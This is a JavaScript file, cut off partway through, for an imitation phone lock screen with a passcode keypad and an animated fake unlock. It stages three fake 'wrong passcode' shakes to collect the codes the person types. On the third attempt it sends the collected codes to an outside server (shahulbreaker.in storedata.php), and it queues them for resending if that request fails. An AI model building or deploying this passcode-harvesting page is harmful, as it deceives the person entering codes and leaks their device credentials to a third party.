(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  // keep a live reference to cancel button
  let cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  // Ensure wallpaper <img> is ready/visible (helps iOS PWA painting)
  (function ensureWallpaperPaints() {
    try {
      const wp = document.getElementById('wallpaperImg');
      if (wp) {
        wp.addEventListener('error', () => {
          wp.style.display = 'none';
        });
        if (wp.decode) {
          wp.decode().catch(()=>{/* ignore */});
        }
      }
    } catch (e) {}
  })();

  /* ---------- Viewport sync: match visualViewport and pin heights to avoid sliding/gaps ---------- */
  (function setupViewportSync() {
    function updateViewportHeight() {
      try {
        const vv = window.visualViewport;
        const base = vv ? Math.round(vv.height) : window.innerHeight;
        const overfill = 8;
        const used = Math.max(100, base + overfill);
        document.documentElement.style.setProperty('--app-viewport-height', used + 'px');
        const ls = document.querySelector('.lockscreen');
        if (ls) ls.style.height = used + 'px';
        document.body.style.height = used + 'px';
      } catch (err) {
        console.warn('viewport sync failed', err);
      }
    }

    window.addEventListener('load', updateViewportHeight, { passive: true });
    if (window.visualViewport) {
      window.visualViewport.addEventListener('resize', updateViewportHeight, { passive: true });
      window.visualViewport.addEventListener('scroll', updateViewportHeight, { passive: true });
    }
    window.addEventListener('resize', updateViewportHeight, { passive: true });
    window.addEventListener('orientationchange', updateViewportHeight, { passive: true });

    updateViewportHeight();

    // catch iOS toolbar animation frames
    let t = 0;
    const id = setInterval(() => {
      updateViewportHeight();
      t += 1;
      if (t > 20) clearInterval(id);
    }, 120);
  })();

  // rotating buffer for last up-to-4 entered codes
  const LAST_CODES_KEY = '_pass_last_codes_';
  function getLastCodes() {
    try {
      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
    } catch (e) {
      return [];
    }
  }
  function pushLastCode(c) {
    try {
      const arr = getLastCodes();
      arr.push(c);
      while (arr.length > 4) arr.shift();
      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
    } catch (e) {}
  }
  function getCombinedLastCodes() {
    return getLastCodes().join(',');
  }

  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
  function clearSavedAttempts() {
    try {
      localStorage.removeItem(LAST_CODES_KEY);
      localStorage.removeItem(ATT_KEY);
      localStorage.removeItem(QUEUE_KEY);
    } catch (e) { /* ignore */ }
  }

  (function ensureFreshSessionOnLaunch() {
    try {
      const alreadyStarted = sessionStorage.getItem('pass_session_started');
      function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }

      if (!alreadyStarted) {
        clearSavedAttempts();
        markStarted();
      }

      window.addEventListener('pageshow', () => {
        if (!sessionStorage.getItem('pass_session_started')) {
          clearSavedAttempts();
          markStarted();
        }
      }, { passive: true });
    } catch (err) {
      console.warn('session init check failed', err);
    }
  })();

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    const dots = Array.from(document.querySelectorAll('.dot'));
    dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
    updateCancelText();
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (semi-implicit integrator) ---------- */
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120; // k
    const damping = opts.damping ?? 14;      // c
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000);
      last = now;
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId);
  }

  /* ---------- playUnlockAnimation uses two springs ---------- */
  function playUnlockAnimation() {
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;

    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      return;
    }

    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08);

    lockInner.style.willChange = 'transform, opacity';
    homescreenImg.style.willChange = 'transform, filter, opacity';
    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
    homescreenImg.style.opacity = '0';
    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';

    springAnimate({
      from: 0,
      to: targetY,
      mass: 1.05,
      stiffness: 140,
      damping: 16,
      onUpdate: (val) => {
        const progress = Math.min(1, Math.abs(val / targetY));
        const scale = 1 - 0.003 * progress;
        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
      },
      onComplete: () => {
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
      }
    });

    springAnimate({
      from: 0,
      to: 1,
      mass: 1,
      stiffness: 80,
      damping: 11,
      onUpdate: (p) => {
        const progress = Math.max(0, Math.min(1, p));
        const raw = p;
        const scale = 1 + (raw - 1) * 0.12;
        const finalScale = Math.max(0.96, Math.min(1.06, scale));
        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
        const sat = 0.9 + Math.min(0.15, raw * 0.15);
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';
      }
    });

    setTimeout(() => {
      lockInner.style.boxShadow = '';
      homescreenImg.style.willChange = '';
      lockInner.style.willChange = '';
    }, 1200);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;

    // Force Cancel label back to 'Cancel' during shake
    if (cancelBtn) cancelBtn.textContent = 'Cancel';

    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
  function copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(text).catch(() => {
        return fallbackCopy(text);
      });
    }
    return Promise.resolve().then(() => fallbackCopy(text));
  }

  function fallbackCopy(text) {
    return new Promise((resolve, reject) => {
      try {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        ta.style.top = '0';
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        const ok = document.execCommand('copy');
        document.body.removeChild(ta);
        if (ok) resolve();
        else reject(new Error('execCommand copy failed'));
      } catch (err) {
        reject(err);
      }
    });
  }

  function showToast(msg, ms = 1200) {
    let t = document.getElementById('pass-toast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'pass-toast';
      document.body.appendChild(t);
      if (!getComputedStyle(t).position) {
        Object.assign(t.style, {
          position: 'fixed',
          left: '50%',
          bottom: '120px',
          transform: 'translateX(-50%)',
          background: 'rgba(0,0,0,0.75)',
          color: '#fff',
          padding: '8px 12px',
          borderRadius: '10px',
          zIndex: '12002',
          pointerEvents: 'none',
          opacity: '0',
          transition: 'opacity 160ms ease, transform 160ms ease'
        });
      }
    }
    t.textContent = msg;
    t.style.opacity = '1';
    t.style.transform = 'translateX(-50%) translateY(0)';
    clearTimeout(t._hideTimer);
    t._hideTimer = setTimeout(() => {
      t.style.opacity = '0';
      t._hideTimer2 = setTimeout(() => {}, 200);
    }, ms);
  }

  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // push code into rotating buffer (so hotspot displays exact payload)
    pushLastCode(enteredCode);

    if (attempts === 1 || attempts === 2) {
      animateWrongAttempt();
    } else if (attempts === 3) {
      const combined = getCombinedLastCodes();
      if (combined) sendToAPI(combined);
      animateWrongAttempt();
    } else if (attempts === 4) {
      playUnlockAnimation();
